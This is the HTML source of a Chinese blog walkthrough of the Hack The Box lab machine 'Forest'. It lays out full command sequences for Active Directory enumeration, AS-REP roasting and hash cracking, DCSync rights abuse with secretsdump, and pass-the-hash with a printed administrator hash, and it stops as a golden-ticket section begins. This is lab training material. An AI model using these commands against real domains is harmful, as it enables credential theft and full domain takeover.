@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="据说这台机器很难，所以我决定逐个端口枚举，正好它也没有HTTP服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:Forest">
+<meta property="og:url" content="http://evilarsene.icu/2021/05/29/HTB-Forest/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="据说这台机器很难，所以我决定逐个端口枚举，正好它也没有HTTP服务">
+<meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Forest/16.png">
+<meta property="article:published_time" content="2021-05-29T12:21:36.000Z">
+<meta property="article:modified_time" content="2021-05-30T15:14:48.927Z">
+<meta property="article:author" content="EvilArsene">
+<meta property="article:tag" content="Windows靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Forest/1.png">
+
+<link rel="canonical" href="http://evilarsene.icu/2021/05/29/HTB-Forest/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>HTB:Forest | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2021/05/29/HTB-Forest/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者 <img src="http://www.hackthebox.eu/badge/image/278745" alt="Hack The Box">">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB:Forest
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-29 20:21:36" itemprop="dateCreated datePublished" datetime="2021-05-29T20:21:36+08:00">2021-05-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-30 23:14:48" itemprop="dateModified" datetime="2021-05-30T23:14:48+08:00">2021-05-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Forest/1.png" alt="1"></p>
+<p>据说这台机器很难，所以我决定逐个端口枚举，正好它也没有HTTP服务</p>
+<p>尝试DNS区域传输，没有收获</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig  @10.10.10.161 htb.local axfr</span><br><span class="line">dig  @10.10.10.161 forest.htb.local axfr</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/2.png" alt="2"></p>
+<p>SMB枚举，没有权限</p>
+<p><img src="/images/Forest/3.png" alt="3"></p>
+<p>LDAP枚举和以前没什么区别，这里允许匿名枚举</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 389 --script ldap-search 10.10.10.161</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -s base namingcontexts</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39;</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;Person)&#39;</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;User)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以通过<code>userPrincipalName</code>或<code>sAMAccountName</code>枚举用户名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;Person)&#39; sAMAccountName</span><br><span class="line">ldapsearch -x -h 10.10.10.161 -b &#39;DC&#x3D;htb,DC&#x3D;local&#39; &#39;(objectClass&#x3D;Person)&#39; userPrincipalName</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用<a target="_blank" rel="noopener" href="https://github.com/ropnop/windapsearch">windapsearch</a>，它的原理相同，输出更美观一些，功能也多一些</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python windapsearch_py2.py -d htb.local --dc-ip 10.10.10.161 -U</span><br><span class="line">python windapsearch_py2.py -d htb.local --dc-ip 10.10.10.161 -G</span><br></pre></td></tr></table></figure>
+
+<p>枚举用户其实使用的是<code>objectCategory=user</code>这个过滤器，我们可以手动选择过滤器，来枚举其他对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windapsearch_py2.py -d htb.local --dc-ip 10.10.10.161 --custom &quot;objectClass&#x3D;*&quot;</span><br></pre></td></tr></table></figure>
+
+<p>发现了服务账号<code>svc-alfresco</code>，</p>
+<p><img src="/images/Forest/4.png" alt="4"></p>
+<p>这是一个很重要的提醒，通过<a target="_blank" rel="noopener" href="https://docs.alfresco.com/process-services/latest/config/authenticate/">文章</a>可以发现，该服务账户的使用需要打开<code>DONT_REQ_PREAUTH</code>，这表示我们可以尝试AS-REP roasting</p>
+<p><img src="/images/Forest/5.png" alt="5"></p>
+<p>再更进一步之前，我决定继续完成枚举工作</p>
+<p>使用CME在空会话下，这里成功枚举出密码策略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.161 --pass-pol -u &#39;&#39; -p &#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>比如<code>Account Lockout Threshold: None</code>就告诉我们，如果想，可以放心的进行多线程暴力破解</p>
+<p><img src="/images/Forest/8.png" alt="8"></p>
+<p>进行RCP枚举(445)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; -N 10.10.10.161</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">rpcclient $&gt; enumdomgroups</span><br></pre></td></tr></table></figure>
+
+<p>这里无法枚举SID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames administrator</span><br><span class="line">result was NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>
+
+<p>但这里可以使用一个Trick来直接枚举组的名称，组内的成员数量，和具体的组内成员是谁，以<code>Domain Admins</code>组为例</p>
+<p>通过组织id号<code>0x200</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; querygroup 0x200</span><br><span class="line"></span><br><span class="line">Group Name:     Domain Admins</span><br><span class="line">Description:    Designated administrators of the domain</span><br><span class="line">Group Attribute:7</span><br><span class="line">Num Members:1rpcclient $&gt; querygroupmem 0x200</span><br><span class="line">rid:[0x1f4] attr:[0x7]</span><br></pre></td></tr></table></figure>
+
+<p>得到rid值<code>0x1f4</code>，我们可以直接查询它，得到用户<code>Administrator</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; queryuser 0x1f4</span><br><span class="line">User Name   :   Administrator</span><br><span class="line">Full Name   :   Administrator</span><br><span class="line">Home Drive  :</span><br><span class="line">Dir Drive   :</span><br><span class="line">Profile Path:</span><br><span class="line">Logon Script:</span><br><span class="line">Description :   Built-in account for administering the computer&#x2F;domain</span><br><span class="line">Workstations:</span><br><span class="line">Comment     :</span><br><span class="line">Remote Dial :</span><br><span class="line">Logon Time</span><br><span class="line">       :      Mon, 07 Oct 2019 06:57:07 EDT</span><br><span class="line">Logoff Time</span><br><span class="line">      :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">Kickoff Time</span><br><span class="line">     :      Wed, 31 Dec 1969 19:00:00 EST</span><br><span class="line">Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT</span><br><span class="line">Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT</span><br><span class="line">Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT</span><br><span class="line">unknown_2[0..31]...</span><br><span class="line">user_rid :      0x1f4</span><br><span class="line">group_rid:      0x201</span><br><span class="line">acb_info :      0x00020010</span><br><span class="line">fields_present: 0x00ffffff</span><br><span class="line">logon_divs:     168</span><br><span class="line">bad_password_count:     0x00000000</span><br><span class="line">logon_count:    0x00000031</span><br><span class="line">padding1[0..7]...</span><br><span class="line">logon_hrs[0..21]...</span><br></pre></td></tr></table></figure>
+
+<p>后面的套路类似，顺着枚举组就行了，类似</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; querygroup 0x201rpcclient $&gt; querygroupmem 0x201</span><br><span class="line">        rid:[0x1f4] attr:[0x7]</span><br><span class="line">        rid:[0x1f7] attr:[0x7]</span><br><span class="line">        rid:[0x1f6] attr:[0x7]</span><br><span class="line">        rid:[0x463] attr:[0x7]</span><br><span class="line">        rid:[0x464] attr:[0x7]</span><br><span class="line">        rid:[0x465] attr:[0x7]</span><br><span class="line">        rid:[0x466] attr:[0x7]</span><br><span class="line">        rid:[0x467] attr:[0x7]</span><br><span class="line">        rid:[0x468] attr:[0x7]</span><br><span class="line">        rid:[0x469] attr:[0x7]</span><br><span class="line">        rid:[0x46a] attr:[0x7]</span><br><span class="line">        rid:[0x46b] attr:[0x7]</span><br><span class="line">        rid:[0x46c] attr:[0x7]</span><br><span class="line">        rid:[0x46e] attr:[0x7]</span><br><span class="line">        rid:[0x46f] attr:[0x7]</span><br><span class="line">        rid:[0x470] attr:[0x7]</span><br><span class="line">        rid:[0x471] attr:[0x7]</span><br><span class="line">        rid:[0x472] attr:[0x7]</span><br><span class="line">        rid:[0x473] attr:[0x7]</span><br><span class="line">        rid:[0x474] attr:[0x7]</span><br><span class="line">        rid:[0x475] attr:[0x7]</span><br><span class="line">        rid:[0x476] attr:[0x7]</span><br><span class="line">        rid:[0x477] attr:[0x7]</span><br><span class="line">        rid:[0x478] attr:[0x7]</span><br><span class="line">        rid:[0x479] attr:[0x7]</span><br><span class="line">        rid:[0x47a] attr:[0x7]</span><br><span class="line">        rid:[0x47b] attr:[0x7]</span><br><span class="line">        rid:[0x47e] attr:[0x7]</span><br><span class="line">        rid:[0x47f] attr:[0x7]</span><br><span class="line">        rid:[0x480] attr:[0x7]</span><br></pre></td></tr></table></figure>
+
+<p>之后有了rid，就可以直接查询用户名了</p>
+<p>最后88端口kerberos就不暴力枚举用户名了，有了之前的技巧我觉得这个操作显得很多余</p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>枚举部分已经精准定位了对账户<code>svc-alfresco</code>的AS-REP roasting攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$GetNPUsers.py htb.local&#x2F;svc-alfresco -no-pass -dc-ip 10.10.10.161 </span><br><span class="line">Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 </span><br><span class="line">SecureAuth Corporation[*] Getting TGT for svc-alfresco</span><br><span class="line">$krb5asrep$23$svc-alfresco@HTB.LOCAL:d02cfbcdfc65857f3bc456c7932ad436$8bcc9e514c1984b22e16885874fe98b09e321a871a88d94b4cbb2411aa06a75180e3f2c74fd0a2e8b21855fa340e5eff7312d8806a33370b54cd0af4a8c5be48a64b82b37e41f4cb8ac6645397952ef1ecfed252944e63ac07a633e332de1d42c2d9738f44eadafe5d652d61f38d197f51c85a1cdef7e408d81ed13660c32814d09a29eb4f7cb04ab73b3fc6b420dd4f547bd16663d8f6b79159d617f994c2f15ad06ca454f3e2620c0bf8bc99874ce2337ab84e28e186b611b1d8bd69cb8213a4976c48e7869be05dad7a463c2a9d38ea495690a999ab4353d6151abb043c8850ea3e955048</span><br></pre></td></tr></table></figure>
+
+<p>破解哈希，得到<code>s3rvice</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/6.png" alt="6"></p>
+<p>这样我们就可以使用凭据<code>svc-alfresco/s3rvice</code>进行WinRM连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</span><br></pre></td></tr></table></figure>
+
+<p>成功获得shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>首先我是用PowerView解决当前用户的嵌套组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\powerview.ps1</span><br><span class="line">Get-Netgroup -username svc-alfresco |select-object name,memberof</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/9.png" alt="9"></p>
+<p>或者直接枚举用户组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainGroup -MemberIdentity svc-alfresco |select-object samaccountname</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/17.png" alt="17"></p>
+<p>输出很有意思，说明当前用户关系</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svc-alfresco属于→Service Accounts属于→Privilege IT Accounts</span><br><span class="line">Privilege IT Accounts同时属于→Account Operators和Remote Management </span><br><span class="line">Users(所以可以WinRM)当然svc-alfresco也属于→Domain Users组</span><br></pre></td></tr></table></figure>
+
+<p>在BloodHound中，我们可以<code>Unrolled Group Membership</code>更清晰的展示</p>
+<p><img src="/images/Forest/10.png" alt="10"></p>
+<p>知道组织关系是之后提权的关键，继续查看<code>Find Shortest Paths to Domain Admins</code></p>
+<p><img src="/images/Forest/11.png" alt="11"></p>
+<h2 id="滥用Account-Operators组GenericAll权限"><a href="#滥用Account-Operators组GenericAll权限" class="headerlink" title="滥用Account Operators组GenericAll权限"></a>滥用Account Operators组GenericAll权限</h2><p><code>Account Operators</code>组内的成员拥有创建/添加账户到不受保护组的权限(受保护的比如<code>Domain Admins</code>组、<code>Account Operators</code>组本身等)和本地登陆域控的权限，参考<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn579255(v=ws.11)#account-operators">链接</a></p>
+<p>这里我们将创建一个账户，并添加到<code>Exchange Windows permissions</code>组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user arsene password123 &#x2F;domain &#x2F;add</span><br></pre></td></tr></table></figure>
+
+<p>习惯性将用户添加到本地<code>Remote Management Users</code>组，这样就拥有了WinRM连接的权限(虽然这里不需要用到该用户的shell)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Management Users&quot; arsene &#x2F;add</span><br></pre></td></tr></table></figure>
+
+<p>为了利用，将用户添加到<code>Exchange Windows permissions</code>组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Exchange Windows permissions&quot; arsene &#x2F;add</span><br></pre></td></tr></table></figure>
+
+<h2 id="滥用Exchange-Windows-permissions组WriteDacl权限"><a href="#滥用Exchange-Windows-permissions组WriteDacl权限" class="headerlink" title="滥用Exchange Windows permissions组WriteDacl权限"></a>滥用Exchange Windows permissions组WriteDacl权限</h2><p>在<code>Exchange Windows permissions</code>组，我们拥有WriteDacl权限，这表示我们可以DCSync参考:<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=4119">链接</a></p>
+<p>首先添加权限(别忘了域账号前缀)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">. .\powerview.ps1</span><br><span class="line">$SecPassword &#x3D; ConvertTo-SecureString &#39;password123&#39; -AsPlainText -Force</span><br><span class="line">$Cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;HTB\arsene&#39;, $SecPassword)</span><br><span class="line">Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC&#x3D;htb,DC&#x3D;local&quot; -PrincipalIdentity arsene -Rights DCSync</span><br></pre></td></tr></table></figure>
+
+<p>这样我就可以进行DCSync了。通过Mimikatz或Secretsdump.py</p>
+<p>secretsdump需要TCP135，445和一个随机的高RPC端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py htb.local&#x2F;arsene:password123@10.10.10.161</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/12.png" alt="12"></p>
+<h3 id="方法1-PTH"><a href="#方法1-PTH" class="headerlink" title="方法1 PTH"></a>方法1 PTH</h3><p>Administrator的Hash没破解成功，但可以进行PTH攻击</p>
+<p>为了有趣不使用<code>psexec.py</code>，因为它会自动提升到SYSTEM权限，脱离了域账号，所以我使用<code>wmiexec.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb.local&#x2F;administrator@10.10.10.161</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/12.png" alt="12"></p>
+<p>或者WinRM也可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法2-Goldenticket-for-Linux"><a href="#方法2-Goldenticket-for-Linux" class="headerlink" title="方法2 Goldenticket for Linux"></a>方法2 Goldenticket for Linux</h3><p>平常<code>GoldenTicket</code>的利用都在目标机器上使用Mimikatz，这次我会在linux利用<code>GoldenTicket</code></p>
+<p>首先在机器上没枚举SID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Addomain htb.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Forest/14.png" alt="14"></p>
+<p>得到`S-1-5-21-3072663084-364016917-1341370565</p>
+<p>不知道为啥，时间设置后在使用psexec时，还会出现时间戳的错误<code>Clock skew too great</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; get-dateWednesday, May 26, 2021 8:18:18 PM</span><br></pre></td></tr></table></figure>
+
+<p>先不管继续后面的操作</p>
+<p>之后生成黄金票据，通过设置环境变量导入</p>
